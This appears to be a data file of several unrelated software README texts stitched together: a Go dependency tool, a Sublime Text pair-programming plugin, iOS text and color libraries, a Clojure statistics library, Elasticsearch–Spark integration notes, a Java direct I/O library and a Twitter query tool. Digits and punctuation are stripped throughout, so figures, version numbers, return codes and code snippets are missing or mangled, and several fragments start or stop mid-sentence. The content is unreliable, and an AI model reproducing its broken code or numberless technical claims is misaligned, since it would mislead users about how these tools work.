godeps file by running jd update  jd will disregard the current dependencies in the godeps file overwriting it with the latest master release for each project you depend upon after pulling of course that may or may not work using the latest release for each dependency could potentially lead to inconsistencies version mismatches  that would make jd complain the dependencies file would have been changed anyway it s your responsibility to decide which projects to upgrade or withhold it s worth noting that jd update does not rely on the godeps file to check current dependencies it takes them from go list instead a nice consequence is that new imports are automatically detected from the code and added to godeps with no manual intervention required and no longer needed imports will be removed as well note also that although the old dependencies file is overwritten the new copy is not committed or even staged for commit in git rationale you should test that everything still works properly you can do that with the rest of your changes without leaving traces in history if you run the update multiple times before you re done these are the return codes for jd  success  error with parameters  bad dependencies or unable to read them  version mismatch detected  external command failed  unable to checkout requested revision johnny deps is intentionally agnostic about the specific workflow used in practice people seem to fall into one of two camps that reflect how they think about dependency management and their differing goals the first category roughly speaking is those who would like to build from the tip of their source control repositories all the time but have a need for pinning some things to a specific version those users may use branch names in godeps as opposed to commit identifiers and change to a specific commit when they need to pin a version nevertheless jd will not automatically fetch the latest changes see retrieving projects the second school of thought holds that the godeps file should contain external dependencies and their exact versions so that checking out a particular revision of an application s repository and running jd will result in exactly the same versions of all of the code used to build the application every time at vividcortex we want to be able to reproduce a binary for debugging or other purposes all of our builds have a command line flag called build version that when present will result in the binary printing out the git revision from which it was built we can thus easily reproduce any version by calling jd build with that revision as the r parameter to embed the revision in the binary we use a specific shell script called build see building above that runs something like go build ldflags x main godeps git rev parse head at the application we set things up so that build version displays the contents of the main godeps variable set by the compiler we welcome issue reports suggestions and especially pull requests  fork the project  write your code in a feature branch  add tests if applicable  run tests always  commit push and send pull request because this is a vividcortex internal tool that we re sharing publicly we may not want to implement some features or fixes add tests those we previously had are not appropriate for the new tool optionally add support for other repositories like mercurial this tool is now targeted at git on github com that is what we use at vividcortex copyright c  vividcortex released under the mit license read the license file for details johnny deps is the combination of several different thought processes from multiple authors with inspiration from tools such as ruby s bundler and dep

4584770, subliminalcollaborator  sublime text  plugin for remote pair programming    massive refactor and irc ssl support after leaving this project for a while to work on other things i came to the conclusion that it was necessary to seriously refactor this plugin before moving forward on any new feature work including sublime text  compatibility after undoing much hackery i am personally satisfied that this is a more readily extensible project instead of an embarrassing mess of callbacks i had trouble tracing also i threw in irc ssl support ssl support on the peer to peer sharing session level still pending    beta release the feature set target for beta has been achieved you can now once you are setup do the following connect to an irc channel and find other subliminalcollaborator clients to share a view over a direct connection local and company network only nat traversal is a planned feature partner can see the file including syntax coloring as was configured by the host at the time of send host and partner can highlight multiple sections of the file and see what the other is highlighting in real time partner s viewpoint follows that of the host when the host moves their viewpoint host edits and cut copy and paste events are sent to the partner automatic resync if the host and partner view become out of sync swap on demand sharing roles initiated by either host or partner  start sublime text   to generate a basic user and accounts sublime settings file select menu preferences package settings subliminalcollaborator settings user  uncomment the following and fill in with the details for your chosen irc server can have multiple under irc then save javascript and and irc and and host irc somewhere com  and and port  and and usessl false and and username  and and password  and and channel subliminalcollaboration in order to share cut copy and paste events in a session some special setup is required  select the menu preferences package settings subliminalcollaborator install edit menu proxy commands or in the command palette select collaborate install edit menu proxy commands to undo this action choose uninstall edit menu proxy commands in the same places  from the command palette collaborate connect to chat server  select the representative chat config string of your choice protocol and host port is the format  once connected from the command palette collaborate start new session  choose the chat connection to use then the username from the list of the known confirmed subliminalcollaborator clients available through this chat at this point a dialog between clients is initiated where the two peers attempt to connect directly using the available ip addresses of the peer hosting the session this may take a while command and ctrl and to see what is actually going on or just follow along with the updates in the status bar  choose a view to share from the presented list of open views now that you are in a session you can do the following as the host edit the shared view in almost any way typical edits such as entering and deleting text as well as cut copy and paste scroll the view and the peer will see what you see any selections are specially highlighted on the peer s view if the view gets out of sync for any reason then an automatic resync will occur with minimal interruption you as the host won t see anything except a brief message in the status bar at any time from the command palette choose collaborate swap roles with peer to request a role change and if your peer accepts then they will become the host and you the watching peer if you are not the host you can see what the host sees and while they are not moving the view you may freely scroll independently highlight regions of interest and those regions will be specially highlighted in the host s view see highlighted regions of the host s view request through the command palette to swap roles with the host via the collaborate swap roles with peer command this is a known issue with the automatic resync mechanism basically chunks of the view are sent very quickly to be updated on the partner side and the view attempts to follow the location of these edits work is ongoing to find a solution to this something bad happened with the plugin you haven t installed the command proxy as instructed below or you uninstalled the plugin without uninstalling the command proxy for most cases you can simply copy the file if it exists from and subliminalcollaborator and main sublime menu backup into path and to and

7661222, coretextview  if your app needs to render both text images or have some custom rendering on the fly then coretextview is for you coretextview contains  major components b coretextview and b uiview based used to render the string b htmlparser and b html parser which generates an instance of nsattributedstring there is also a category for nsattributedstring for easy creation of nsattributedstring objects please also refer to the demo project for a working demo objective c mcoretext attributedstring nsattributedstring attributedstringwithhtml span font papyrus size  color

html renderer id htmlrenderer nsmutabledictionary attributes return bluecircle alloc init since coretextview was designed mainly to work with custom renderers passing attributes from the html to the callback should be as simple as possible for that reason the syntax is based on plain old html tags and not modern css the callback receives an instance of nsmutableattributes which contains all available attributes of that html node the syntax was meant to be as simple as possible and at no point was it designed to follow html standards for that reason some of the html tags and attributes might differ from the original specs for example lt s gt for stroke rather than lt stroke gt span font arialmt and georgia and noorehira and size  font manipulation we can change font name and size and font u style none and single and thick and double underline and u i italic and i s width  color rgb  red stroke and s span align natural and left and right and center and justified aligned text and span span direction rtl and ltr rtl or ltr text and span span wrap word and break word and clip and ellipsis head and ellipsis tail and ellipsis middle wrapped text and span span color ff standard html colors and span span color rgb  rgb color and span span color rgba   rgba color and span by default all links will render using a blue color and a single underline which you can override using the code color and code tag and an embedded code u and code tag coretextview will try by default to open any link using code uiapplication sharedapplication openurl url and code you can prevent this behaviour by returning yes from code bool coretextview coretextview view openurl nsurl url and code delegate images can be embedded using the b base and b prefix or be loaded from disk images will be loaded using code uiimage imagenamed src and code unless the b file and and and b scheme is specified for images you can also use the code valign middle and code attribute to center them vertically custom renderer sometimes your app needs to render some content dynamically one option would be to generate an image and create a new nsattributedstring every time or you can use a custom renderer custom renderers use a callback passing a graphic context to draw into an app can then use it to draw whatever it needs to create a custom renderer simply use a code div and code tag inside your html you can also set custom attributes which will be passed to the renderer factory custom attributes allow you to distinguish between different renderers in the same html to be able to create a custom renderer you ll need to pass a callback to the html parser objective c mcoretext attributedstring nsattributedstring attributedstringwithhtml html renderer id htmlrenderer nsmutabledictionary

color can be applied to the sliders because there are no key color requirements the buttons must have a key color appropriate tint color so a default blue is used in that situation there are of course tons of changes improvements and simplifications i ve been thinking about and may integrate in the future i m only one person so any contributions are much appreciated feel free to go through the issue tracker to find and fix issues and enhancements to the project email me mailto matt mdznr com subject contributing to colors project body hello i d like to help with the colors project how can i help with any questions you may have then submit a pull request thank you for helping out install the documentation into xcode with the following steps  open xcode preferences  choose downloads  choose the documentation tab  font color red warning this doesn t work and font  click the plus button in the bottom right and enter the following url  click install next the new row reading colors documentation if you don t see it and didn t get an error try restarting xcode be sure you have the docset selected in the organizer to see results for colors if you just wish to add the framework at it s current state to your project simply drag and drop colors framework located in the repo s root directory to the project navigator in xcode adding framework to project screenshots and readmeimages and addingframeworktoproject png then just add objc and allload to other linker flags in your xcode project this makes sure that the categories in the framework attach to the classes in other frameworks adding other linker flags screenshots and readmeimages and otherlinkerflags png any future updates to the framework require the framework file to be manually replaced if you are still having issues try looking one of the including demo apps in the demo apps folder in the repo s root directory if you wish to modify the framework or are doing development on the framework itself and want to use it in an application you must build the framework project framework project and colors xcodeproj yourself  after building the project right click on libcolors a under products in the project navigator in xcode  in that same directory there should be a file named colors framework  move and replace colors framework to the root of the colors repo use this framework in your app note at this point in time this must be done manually after each change to use the colors framework simply add the following line to your source file you can also import individual files instead of the whole framework for faster compile times by doing something like

7746405, a library to create computation engines easily gather data and compute summary measures in a declarative way clojure readyforzero and babbage    in your project clj require babbage core refer all core functions require babbage provided core as b some basic provided statistics the basic interface which performs aggregations and partitions over seqs is provided by the functions stats  sets  and calculate stats is used to declare the measures using measure functions to calculate sets is used to declare the subsets computation across subsets of the input over which the measures should be calculated calculate takes these two as arguments sets is optional  and makes the computation run over the provided seq clojure calculate the sum of a seq of elements user calculate stats identity b and sum a stat that s the sum of the elements     all sum  the sum of all elements is  b babbage and b also provides a mechanism to perform efficient computation over directed graphs efficient computation of inputs  using the functions defgraphfn to define a unit of work and its dependencies and run graph to execute the computation of a graph the stats function takes an extraction function as its first argument and an arbitrary number of measure functions as its remaining arguments in the simplest possible case as we saw above the extraction function is identity clojure calculate the sum of a seq of elements user calculate stats identity b and sum     all sum  the sum of all elements is  frequently we will want to both name the result and perform some kind of operation on the elements of the input clojure calculate the sum over a seq of elements with an extraction function user calculate the result stats x b and sum compute the sum over x s call it the result x  x  all the result sum  multiple measures can be computed in one pass clojure compute the mean and sum of x s user calculate the result stats x b and sum b and mean explicitly request computation of mean and sum x  x  all the result mean   count  sum  the count measure is required by mean  so it s automatically computed and we can compute multiple measures over multiple fields in one pass clojure compute multiple measures over multiple fields in one pass user calculate x result stats x b and sum b and mean y result stats y b and mean add mean for y s call it y result x  y  x  x  y  all x result count  mean   sum   y result count  mean   sum  extraction functions can really perform arbitrary operations on their inputs clojure accumulate the mean over the sum of the two fields user calculate both stats and or x  compute the mean of this function on each element or y  b and mean x  y  x  x  y  all both count  mean   sum  extraction functions will only be called once per item in the input seq sometimes we will want to compute measures for multiple functions of the input together however in the call stats extractor fn measure measure  all the measure functions receive the result of calling extractor fn on an input item while we could make the extractor function return sequences or maps that would require modifying all the measure functions to further extract the right elements to get around this babbage core exports three functions for making the whole item available within a stats call by  map with key  and map with value the interface to all these functions is similar to that for stats the first argument is an extractor function the second argument is the key to be used in the results map and the remaining arguments are arbitrarily many measure functions suppose your input is maps of the form sale x userid y ts t  representing the amount x of a sale to user y at time t you want to know the total and mean of the sales and you also want to know how many individual users made purchases clojure given a list of sale and user id pairs compute unique users user calculate stats sale b and mean b and sum by userid users b and count unique sale  userid  sale  userid  sale  userid  sale  userid  sale  userid  all mean   users unique  count binned        count unique depends on count binned sum  count  or you might want to know the means and total for each user s purchases clojure given a list of sale and user id pairs compute measures for each user s sales user calculate stats sale b and mean b and sum map with key userid user sales b and mean b and sum sale  userid  sale  userid  sale  userid  sale  userid  sale  userid  all mean   user sales  mean   count  sum    mean   count  sum    mean   count  sum   sum  count  simply compute the same measures across multiple subsets in one pass sets takes a single argument a map whose keys are names of sets and whose values are predicates indicating whether a member of the input seq belongs in the set clojure we take the previous example and compute the same measures but considering different subsets of elements user calculate sets has y y compute measures over elements with y both stats and or x  or y  b and mean x  y  x  x  y  all both mean   sum  count   we always compute over all has y both mean   sum  count  only two elements in the seq had y given an initial predicate map arbitrary compositions of those predicates can be performed clojure construct my sets using complement and intersection user def my sets sets has y y good good complement good adds a set called not good intersections has y good not good two more sets has y and good and has y and not good construct my fields as per examples above user def my fields both stats and or x  or y  b and mean make it go user calculate my sets my fields x  good true y  x  good false x  good true x  good false y  shas y and not goodz both mean   sum  count   the result contains our compositions shas y and goodz both mean   sum  count   good both mean   sum  count   has y both mean   sum  count   all both mean   sum  count   not good both mean   sum  count  seamless inspection across multiple subsets user xget  good not good both mean get the mean for good and not good     predicate functions will only be called once per item in the input seq when calculating nontrivial measures over real data we will often want to do some transformation of the data to make it tractable or at least to minimize verbosity and redundancy in the extraction or set definition functions babbage graph contains tools for declaring dependency relations among computations and running such computations efficiently in the spirit of the clojure user defgraphfn sum xs apply and xs user defgraphfn sum squared xs sum map xs user defgraphfn count input count xs count xs user defgraphfn mean count sum double and sum count user defgraphfn mean count sum squared double and sum squared count user defgraphfn variance mean mean mean mean mean user run graph xs     sum variance sum squared count input mean mean count  sum squared  mean   variance   mean   xs     functions defined with defgraphfn can be invoked like ordinary clojure functions defined with defn or fn  because that s what they are the only difference is that the functions carry some metadata about their dependencies and their names around with them because of this they can be wrapped by arbitrary other functions as long as the metadata is appropriately transferred see for example track calls in babbage test graph when called with run graph or its variations  the graph function mean can refer to the results of the graph function sum simply by including sum in its argument list since a we might want to choose dynamically between multiple functions that can provide the same output to further functions and b a name that describes a function s output might be undesirable for the name of the function itself because it might shadow a core function for instance  we can explicitly declare what name a graph function s output should have when other graph functions want to refer to it as in count input in the example above run graph takes a map of initial input names and values and any number of graph functions it analyzes the dependency graph throwing an error in case of unavailable or circular dependencies and otherwise runs the functions provided with the input provided by default it runs its argument functions in parallel when possible and evaluates the results strictly run graph strategy can be used to force sequential evaluation or lazy evaluation clojure user defgraphfn foo a println in foo user defgraphfn foo a println in foo inc a user defgraphfn bar foo println in bar foo foo user defgraphfn baz foo println in baz foo  user defgraphfn quux bar baz println in quux bar baz user def r run graph strategy lazy true a  foo bar baz quux user baz r user baz r user quux r compile graph and compile graph strategy can be used to analyze the dependency graph once at run time returning a function that can be called directly clojure user def f compile graph foo bar baz quux user f a  quux  baz  bar  foo  a  run graph and run graph strategy can be used to attempt to analyze the dependency graph at compile time falling back to their un asterisked analogues if that is not possible several measure functions are predefined in babbage provided core measure functions that take no arguments th name and th th effect and th measure functions that take arguments code of and code must be a keyword naming a value that a measure function will place in the result map to can either be a keyword or a number if code ratio name and code is provided it must be a keyword it will be used as the key in the result map for the ratio otherwise code of and code and code to and code will be used to create a key of the form code of and code to code to and code e g  code ratio max a measure function is built out of an underlying monoid or a function that depends on a measure function and a public function that associates the measure with a descriptive name into a map for simple functions the defstatfn macro in babbage core and the monoid function in babbage monoid can be used to reduce boilerplate for instance the following would record the first non nil value in the input sequence clojure user def m fst monoid fn a b a nil user defstatfn fst m fst user calculate stats x fst sum x nil x  x  x  all sum  fst  the statfn macro can be used to create an anonymous measure function that depends on runtime values see babbage provided core and histogram and babbage provided core and ratio for examples the monoid function takes a binary operation and a value that is a left and right identity when the operation has non nil arguments nil is special cased to always be an identity and returns a function that creates instances of babbage monoid and monoid more complex measures can implement the protocol directly see babbage monoid gaussian for an example measures that depend on already computed measures e g the ratio of one to another are also a combination of an underlying function that does the actual computation and a public function that associates the measure with a name in a map in this case both functions declare their dependencies clojure keeping track of unique counts is dependent on keeping track of the seen ones defnmeta just associates the attr map metadata with both the var and the function defnmeta d count unique requires count binned m count get m count binned defstatfn count unique d count unique requires count binned name unique d count unique declares that it expects the result map it is passed to contain the count binned key count unique uses d count unique to compute its results says that its result is named unique  and requires the function count binned using count unique will result in count binned being used as well in this case there is some redundancy in the declarations because count unique s requirements are known statically copyright c readyforzero inc all rights reserved at each increase of knowledge as well as on the contrivance of every new tool human labour becomes

22336227, spark is an in memory processing framework and outperforms hadoop up to a factor of  spark is accompanied by to context aware recommendations up to text analysis elasticinsight empowers elasticsearch to seamlessly uses these multiple engines besides linguistic and semantic enrichment for data in a search index there is an increasing demand to apply knowledge discovery and data mining techniques and even predictive analytics to gain deeper insights into the data and further increase their business value one of the key prerequisites is to easily connect existing data sources to state of the art machine learning and predictive analytics frameworks in this project we give advice how to connect elasticsearch a powerful distributed search engine to apache spark and profit from the increasing number of existing machine learning algorithms the figure shows the integration pattern for elasticsearch and spark from an architectural persepctive and also indicates how to proceed with the enriched content i e the way back to the search index the source code below describes a few lines of scala that are sufficient to read from elasticsearch and provide data for further mining

clustering elasticsearch data with k means is a first and simple example of how to immediately benefit from the integration with spark other business cases may cover recommendations suppose elasticsearch is used to index e commerce transactions on a per user basis then it is also straightforward to build a recommendation system in just two steps first  implicit user item ratings have to be derived from the e commerce transactions and second  from this item similarities are calculated to provide a recommendation model as sql queries generate spark data structures a mixture of sql and native spark operations is also possible thus providing a sophisticated mechanism to compute valuable insight from data in real time the code example below illustrates how to apply sql queries on a spark data structure rdd and provide further insight by mixing with native spark operations elasticsearch specific configuration val esconf new configuration esconf set es nodes  localhost esconf set

popular topic with a wide range of application areas high frequency trading finance  real time bidding adtech  real time social activity social networks  real time sensoring internet of things  real time user behavior and more gain tremendous business value from real time analytics there exist a lot of popular frameworks to aggregate data in real time such as apache storm apache s apache samza akka streams sqlstream to name just a few spark streaming which is capable to process about  records per node per second for simple aggregations on small records significantly outperforms other popular streaming systems this is mainly because spark streaming groups messages in small batches which are then processed together moreover in case of failure spark streaming batches are only processed once which greatly simplifies the logic e g to make sure some values are not counted multiple times spark streaming is a layer on top of spark and transforms and batches data streams from various sources such as kafka twitter or zeromq into a sequence of spark rdds resilient distributed datasets using a sliding window these rdds can then be manipulated using normal spark operations this project provides a real time data integration pattern based on apache kafka spark streaming and elasticsearch and may then be consumed by a set of different consumers in this project we use spark streaming as a consumer and aggregator of e g such tracking data streams and perform a live indexing as spark streaming is also able to directly compute new insights from data streams this data integration pattern may be used as a starting point for real time data analytics and enrichment before search indexing building rest and http based integration layers on top of scala and akka as it is asynchronous actor based fast lightweight and modular it is an easy way to connect scala applications to the web the code example below illustrates that such an integration pattern may be implemented

17327221, java direct i and o jaydio  jaydio is a java library for giving the programmer finer control over file i and o in part by bypassing the os buffer cache for now only linux is supported jaydio serves as as a starting point for asynchronous and non blocking direct i and o custom file page caching layers and even advanced cache replacement currently it is useful for preventing the operating system from evicting memory pages which need to stay warm in favor of non critical file pages adding jaydio to your project  if you use maven you can add the following to your pom xml dependencies dependency groupid net smacke and groupid version   and version and dependency and dependencies alternatively if you don t want to deal with maven or with tracking down dependencies manually the following are also available if you want to verify the jar against my gpg public key the api reference for jaydio is located in the how it works  jaydio works by passing the odirect flag to the linux open system call unfortunately talking directly to disk imposes some nasty rules about how many bytes can be written at a time and where they can be written in particular all writes must be in multiples of the file system block size and they must originate from chunks of memory aligned to the memory page size and they must also occur at file system block boundaries see man  open search for odirect and man  posixmemalign for more details fortunately with jaydio you don t have to worry about any of that all of the nasty alignment rule parameters are determined on the fly so that native libc file reads and writes may be used to bypass the os cache jaydio uses and other native magic int buffersize   and and use  mib buffers byte buf new byte buffersize directrandomaccessfile fin new directrandomaccessfile new file hello txt  r  buffersize directrandomaccessfile fout new directrandomaccessfile new file world txt  rw  buffersize while fin getfilepointer fin length int remaining int math min buffersize fin length fin getfilepointer fin read bufremaining fout write bufremaining fin close fout close here is a plot of memory use on my system during a copy of a   gb file under different scenarios the first scenario red corresponds to having plenty of memory free about   gb at the start of the copy  so that if need be we could basically fit two copies of file in memory the second scenario blue  my system has limited memory available about  mb when copying begins the third scenario green  we use jaydio for the file copy yay  with buffers totaling about  mib for each scenario completion of the copy is indicated by a vertical dotted line as you can see jaydio successfully bypasses the os buffer cache and uses no memory other than the small buffers allocated to it interestingly enough for scenario  blue ram limited  we re only taking marginally less time than direct i and o for the copy this is likely because we ran out of ram early on and so are effecively doing direct i and o at the point where the blue curve flatlines as we need to free up space in the cache whenever we do a write jaydio takes about  seconds to do the copy ram limited cp takes about   seconds and ram abundant cp takes about   seconds on my system for a   yes and in  of cases you will want to use it as mentioned earlier jaydio serves as a starting point for implementing more advanced cache replacement policies than lru but there are also times when you want to prevent the operating system from evicting certain memory pages in favor of caching files as far as i know noreuse is a no op you could use dontneed  and you would likely see better performance in terms of raw speed  too unfortunately this sort of strategy does not discriminate between cached pages that you want to save and those that you want to write back to disk if say the same file has been opened by multiple threads of differing priorities regarding memory accesses is one example of a situation where this sort of strategy will not work this is the very uninformative libc error that you get when something goes wrong when opening a file chances are that your file system does not support opening files with the odirect flag for example if you encrypt your home directory using a file system like ecryptfs you can t use direct i and o there contributing  any contribution whether it be a bug report or new core functionality is welcome please feel free to fork and send pull requests that being said contributions which include unit tests are preferred once you have cloned the source one of the easier ways to get set up is with plugin just go to file new project maven project and point the root directory to wherever you cloned jaydio if you don t have meclipse  you can still set things up easily if you run mvn eclipse eclipse wherever you cloned jaydio to set up project and classpath files for eclipse from eclipse then do file new java project and point the root project directory to the jaydio directory lastly if you find some use for jaydio one excellent way to contribute is to shoot me an email describing what you re doing i d love to hear about it this library is

563317, tweeql makes interacting with the twitter api as easy as sql makes it to interact with relational data for example the tweeql query select brand text as brand sentiment text as sentiment from twittersample will run two user defined functions brand and sentiment to extract brand names and expressed user sentiment from the text of every tweet that passes through the twitter streaming api all this without having to worry about the details of implementing the api correctly community  installation  there are two options for installing tweeql  easyinstall and pip something like sudo easyinstall tweeql or sudo pip install tweeql at the command line should suffice  from github after checking out this repository run sudo python setup py install to install note if you do this in ubuntu and debian type sudo apt get install python setuptools first installing python in windows  run python setup py install on the windows command line initializing your settings  tweeql requires a settings py file in your current working directory before you can use it the simplest way to get a working settings py file is to get the template into your current directory this file should work without editing you can edit it to provide a username and password for the streaming api or to change the database into which extracted data will be inserted edit settings py to include the username of the account you created at geonames a first example  after installing tweeql you should be able to run the tweeql command line by typing tweeql command line py marcua marcua x tweeql command line py check if consumerkey consumersecret accesstoken and accesstokensecret are defined in settings py consumer key xxx consumer secret access token xxx access token secret tweeql once at the tweeql command line you can enter sql like queries which will hit the twitter streaming api to see tweets from the twitter spritzer stream type select text from twittersample tweeql select text from twittersample n o sei realmente o que decidir da minha vida muito confusa s                  these should stream by your screen relatively quickly hit ctrl and c to stop the query to exit tweeql hit ctrl and c again queries by example  tweeql syntax  tweeql borrows its query syntax from sql and so queries are of the form select field field from streams where filterconditions group by field field window x seconds these keywords work just like in sql except for the window key word which applies to group by because twitter offers an infinite stream of data aggregates which use group by would never emit any groups window x seconds tells tweeql to emit the aggregates in the group by statement every x seconds providing a rolling window over which to aggregate groups twitter vs twittersample  our first tweeql query was select text from twittersample twittersample is a stream known in the twitter api as the spritzer stream it is a sample of tweets that constitutes approximately  of twitter s firehose you can issue queries to twittersample without any filter conditions though you are free to further filter this stream if you wish to access more than a sample of the tweets on the stream you have to query twitter rather than twittersample to avoid excessive costs twitter requires that you issue at least one filter condition along with your query for example you can get all tweet text for tweets that contain the word obama by issuing the following query select text from twitter where text contains obama you can also filter the results by tracking individual users or by querying geographic regions though this is not currently implemented in tweeql at the moment e mail me if this is important to you tweets have several fields which one can filter select or aggregate across the fields are currently text tweet text  location user defined location like boston or france earth  lang user specified language  profileimageurl the url of the user s profile image  userid the user s twitter userid  screenname the user s username  and createdat the time of the tweet you can add more by editing tweeql and twitterfields py fields can appear in select where or group by clauses and can be separated by commas to add to our last query we might want to find the username tweet time and tweet text of all tweets containing the text obama and have a non null location select screenname createdat text from twitter where text contains obama and location null saving tweets to a database  printing tweets to your screen might be fun but it s not always the desired result tweeql provides an into keyword to faciliate dumping tweets to other locations by default when not specified  tweeql sends tweets into stdout the screen alternatively you can send tweets into table tablename  which will insert the tweets into a table tablename for example select screenname text from twitter into table obamatweets where text contains obama if obamatweets does not exist it will be created with the schema specified by the select parameters if the table already exists and matches the schema of the select parameters tweets will be appended to that location the database which contains the table is specified in settings py either through the databaseuri or databaseconfig parameters by default a sqlite database called test db will be created in your current working directory for performance reasons tweeql batches records in groups of  before inserting them into the database this means that if you end the query before  records are generated you will lose those records e mail me if you require a more durable solution functions  tweets are hardly data on their own most meaningful uses of the tweet stream will require some finessing of the data that comes from the stream as such you can run functions that infer information or derive structure from the various fields that tweeql offers by default these functions can appear anywhere a field appears in a query the functions that come with tweeql are strlen val takes val a string and returns the length of the string example select strlen text as length from twittersample will print the length of the text of each tweet sentiment val takes a string val and returns the sentiment of the text sentiment classification a positive value indicates positive sentiment a negative one indicates negative sentiment and  indicates neutral or no discernible sentiment the magnitude of the value is used for aggregation it does not indicate strength of the sentiment and represents the inverse of the recall of the classifier for positive and negative tweets example select sentiment text as sentiment from twittersample will return the sentiment of tweets on the spritzer stream tweetlatlng lat and tweetlatlng lng returns the latitude or longitude of the tweet if the tweet is geotagged e g by a mobile device  this precise value is used if no geotagging information is provided we use a geocoding service to get latitude and longitude values for the user specified location field example select tweetlatlng lat as latitude tweetlatlng lng as longitude screenname from twittersample returns the latitude longitude and username of twitter users tweeting on the stream floor val granularity returns the floor of a floating point value to the granularity of granularity example select floor tweetlatlng lat   as latitude floor tweetlatlng lng   as longitude screenname from twittersample rounds the latitude and longitudes in the previous example to the multiple of  less than or equal to the actual value temperaturef val returns the temperature in fahrenheit described in the string val performs a regular expression match along the lines of floating point number  c and f which matches strings such as  c and  f when a celcius temperature is matched converts to fahrenheit example select temperaturef text as temperature tweetlatlng lat as latitude tweetlatlng lng as longitude from twitter where text contains c or text contains f and temperature null retrieves temperatures and latitude and longitude pairs expressed on the stream meandevs val group group  returns the mean deviation of val from the group depicted by group group mean deviations can act in place of standard deviations for outlier detection in streaming scenarios during a learning phase of  observations per group meandevs returns negative values example select temperaturef text as temperature tweetlatlng lat as latitude tweetlatlng lng as longitude from twitter where text contains c or text contains f and temperature null and meandevs temperature floor tweetlatlng lat    floor tweetlatlng lng    to avoid pulling in temperatures from tweets such as it s  c in here we want to pull in tweets whose deviation from the mean within a  degree latitude and longitude box is less than  in practice you will also want this mean deviation check to drop deviations that are negative since the system is still in a data collection phase for that group you can define your own functions as well to learn how read the user defined functions section below aggregate queries  tweeql provides sql like aggregates avg  count  sum  min  and max since these functions are operating on a stream tweeql also provides a window keyword which allows you to set the time window over which to calculate the aggregate values before emitting them for example select location count text as numtweets from twittersample group by location window  seconds would return the location and number of tweets at that location on the spritzer stream every  seconds programmatic access  working from the tweeql command line is a good way to get started but you might want to issue tweeql queries programmatically from tweeql exceptions import tweeqlexception from tweeql queryrunner import queryrunner runner queryrunner runner runquery select text from twittersample  false queryrunner runquery takes a tweeql query and executes it the second argument to runquery determines whether the query runs asynchronously or not in this case the program blocks on the runquery call because the second argument is false if you run with the second argument as true  a new thread will execute the query to stop an asynchronous query programmatically use runner stopquery user defined functions udfs  from tweeql exceptions import tweeqlexception from tweeql fielddescriptor import returntype from tweeql functionregistry import functioninformation functionregistry from tweeql queryrunner import queryrunner class stringlength returntype returntype integer staticmethod def factory return stringlength strlen def strlen self tupledata val  returns the length of val which is a string  return len val fr functionregistry fr register stringlength  functioninformation stringlength factory stringlength returntype runner queryrunner runner runquery select stringlength text as len from twittersample  false you can include any number of arguments after tupledata in our case we only take one the string val which we wish to take the length of note that when we run the query on the last line of this example we pass text as an argument to stringlength this is the value that val will take on after we have defined our udf in stringlength  we then register the function to do this we create a functionregistry  which is a singleton and register the function as the tweeql stringlength function you can see the stringlength function in action on the last line of this example it s a first class citizen of our queries now projects on which tweeql depends  tweepy twitter api in python tweeql would not exist without tweepy pyparsing for the tweeql parsing sqlalchemy for putting results into a relational database ordereddict for creating an lru cache of keys geoloc cache geopy for geolocation nltk for sentiment analysis tweeql is bsd licensed do what you will with it but be nice
